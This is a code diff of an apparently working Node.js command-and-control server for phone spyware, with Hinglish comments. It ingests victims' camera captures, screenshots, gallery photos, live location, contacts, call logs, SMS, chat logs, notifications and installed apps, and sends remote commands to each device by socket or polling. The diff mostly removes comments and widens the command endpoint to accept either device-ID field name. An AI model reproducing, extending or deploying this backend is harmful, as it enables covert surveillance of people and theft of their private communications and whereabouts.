@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Battery & Gallery Fixed!');
+    res.send('✅ Server Running: Battery & Gallery Reset Ready!');
 });
 
 // ==================================================
@@ -103,17 +103,14 @@ app.post('/api/upload-image', (req, res) => {
     const id = device_id.toString().trim().toUpperCase();
     
     // --- 🔥 GALLERY LOGIC START ---
-    // Agar type mein ID chhupi hai (gallery-12345), to usse tod kar folder aur ID alag karo
     let folderName = "gallery"; 
-    let publicId = Date.now().toString(); // Default (Screenshot/Camera ke liye timestamp)
+    let publicId = Date.now().toString(); 
 
     if (type && type.includes("-")) {
-        // Sirf Gallery ke liye ID use karo taki Duplicate na bane
         const parts = type.split("-"); 
         folderName = parts[0];  
         publicId = parts[1];    
     } else if (type && type !== "null" && type !== "") {
-        // Screenshot, Front, Back camera waisa ka waisa rahega
         folderName = type;
     }
     // --- 🔥 GALLERY LOGIC END ---
@@ -124,7 +121,7 @@ app.post('/api/upload-image', (req, res) => {
     cloudinary.uploader.upload(base64Image, 
         { 
             folder: folderPath, 
-            public_id: publicId, // Gallery ke liye ID, bakiyo ke liye Time
+            public_id: publicId, 
             resource_type: "image", 
             width: 1280, 
             quality: "auto", 
@@ -194,7 +191,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  🔥 STATUS & COMMAND (FIXED BATTERY ISSUE HERE)
+//  🔥 STATUS & COMMAND
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -216,35 +213,26 @@ app.post('/api/status', (req, res) => {
 
         const id = device_id.toString().trim().toUpperCase();
         
-        // Agar device pehle se nahi hai, to banao
         if (!devicesStatus[id]) {
             devicesStatus[id] = { id: id, command: "none" };
         }
 
-        // 🔥 FIX: Battery aur Status Update Logic
-        // Purani value ko 'preserve' karo agar nayi value nahi aayi
         devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
         devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
         devicesStatus[id].version = version || devicesStatus[id].version || "--";
         devicesStatus[id].charging = (String(charging) === "true");
         
-        // Location update
         devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
         devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
         devicesStatus[id].accuracy = accuracy || devicesStatus[id].accuracy || 0;
         devicesStatus[id].speed = speed || devicesStatus[id].speed || 0;
         
-        // Time update
         devicesStatus[id].lastSeen = Date.now();
 
-        // 🔥 FIX: Command Logic (Loop Stopper)
         let commandToSend = "none";
         
-        // Agar koi command pending hai
         if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
             commandToSend = devicesStatus[id].command;
-            
-            // Command bhej diya? Ab "none" kar do taaki loop na bane
             devicesStatus[id].command = "none";
         }
 
@@ -255,7 +243,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE (Smart Deduplication Added)
+//  🔥 DATA STORAGE (Smart Deduplication)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -269,7 +257,6 @@ app.post('/api/upload_data', async (req, res) => {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
         let finalData = parsedData;
 
-        // --- LOCATION UPDATE ---
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             if (locObj && (locObj.lat || locObj.latitude)) {
@@ -280,30 +267,22 @@ app.post('/api/upload_data', async (req, res) => {
             }
         }
 
-        // 🔥 FIX 1: CONTACTS DEDUPLICATION (Ek Number = Ek Entry) 🔥
         if (type === 'contacts') {
             let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
-            
-            // Ye magic logic duplicate numbers uda dega
             const seenNumbers = new Set();
             finalData = [];
 
             for (const contact of rawList) {
-                // Number saaf karo (spaces aur dashes hatao)
                 let num = contact.phoneNumber ? contact.phoneNumber.replace(/\s+|-/g, '') : '';
-                
-                // Agar ye number pehle nahi dekha, tabhi add karo
                 if (num && !seenNumbers.has(num)) {
                     seenNumbers.add(num);
                     finalData.push(contact);
                 }
             }
         }
-        // 🔥 FIX 2: Apps & Call Logs -> Direct Overwrite (No Duplicates)
         else if (['installed_apps', 'call_logs'].includes(type)) {
              finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
         } 
-        // 🔥 FIX 3: Chat, SMS, Notifications -> Append (Jodte raho)
         else {
             let existingData = [];
             try {
@@ -314,11 +293,9 @@ app.post('/api/upload_data', async (req, res) => {
             } catch (e) { }
 
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
-            
             if (type === 'chat_logs') {
                 newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
             }
-            
             finalData = [...newDataArray, ...existingData].slice(0, 5000); 
         }
 
@@ -331,7 +308,6 @@ app.post('/api/upload_data', async (req, res) => {
     }
 });
 
-// ✅ MISSING API: Dashboard Data Fetch
 app.get('/api/get-data/:device_id/:type', async (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
     try {
@@ -346,14 +322,26 @@ app.get('/api/get-data/:device_id/:type', async (req, res) => {
     }
 });
 
-// Fallback command API
+// ==================================================
+//  🔥 COMMAND API (Updated for Button Support)
+// ==================================================
 app.post('/api/send-command', (req, res) => {
-    let { device_id, command } = req.body;
-    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
-    const id = device_id.toUpperCase().trim();
+    // 🛑 Note: Frontend sends 'deviceId', Server usually uses 'device_id'.
+    // Yahan hum dono check kar rahe hain taaki button fail na ho.
     
-    io.to(id).emit('command', command);
+    let { device_id, deviceId, command } = req.body;
+    
+    let targetID = device_id || deviceId; // Jo bhi mile use karo
 
+    if (!targetID || !command) return res.status(400).json({ error: "Missing Info" });
+    
+    const id = targetID.toUpperCase().trim();
+    
+    // 1. Socket se bhejo (Instant)
+    io.to(id).emit('command', command);
+    console.log(`📡 Command Sent via API: ${command} -> ${id}`);
+
+    // 2. RAM mein save karo (Polling ke liye)
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     devicesStatus[id].command = command;
     
